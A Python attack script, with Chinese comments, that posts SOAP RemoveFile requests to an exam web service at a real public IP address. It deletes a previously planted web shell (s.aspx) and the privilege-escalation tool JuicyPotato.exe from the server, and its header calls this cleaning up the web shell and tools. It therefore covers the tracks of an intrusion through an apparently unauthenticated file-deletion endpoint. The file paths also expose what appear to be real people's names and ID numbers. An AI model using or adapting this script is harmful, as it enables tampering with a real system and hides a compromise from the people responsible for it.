import requests
import re

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

# 之前 check_upload_path.py 获取到的 FullPath
# 如果你需要删除多个，可以把路径放进列表
FILES_TO_REMOVE = [
    r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\孔佑勇(101011861 计算机科学与工程学院)\09J25115 黄高乾\A01\s.aspx",
    r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\孔佑勇(101011861 计算机科学与工程学院)\09J25115 黄高乾\A01\JuicyPotato.exe"
]

def remove_file(path):
    print(f"[*] 正在删除文件: {path}")

    # 需要对路径进行 XML 转义
    safe_path = path.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <RemoveFile xmlns="http://tempuri.org/">
          <path>{safe_path}</path>
        </RemoveFile>
      </soap:Body>
    </soap:Envelope>"""

    try:
        resp = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=HEADERS, timeout=10)

        if resp.status_code == 200:
            print("    [+] 删除成功 (HTTP 200)")
        elif resp.status_code == 500:
            print("    [!] HTTP 500 - 可能是文件不存在或权限不足")
            # print(resp.text[:200])
        else:
            print(f"    [-] 删除失败: {resp.status_code}")

    except Exception as e:
        print(f"    [!] 异常: {e}")

if __name__ == "__main__":
    print("=== 清理 WebShell 及工具 ===")
    for f in FILES_TO_REMOVE:
        remove_file(f)
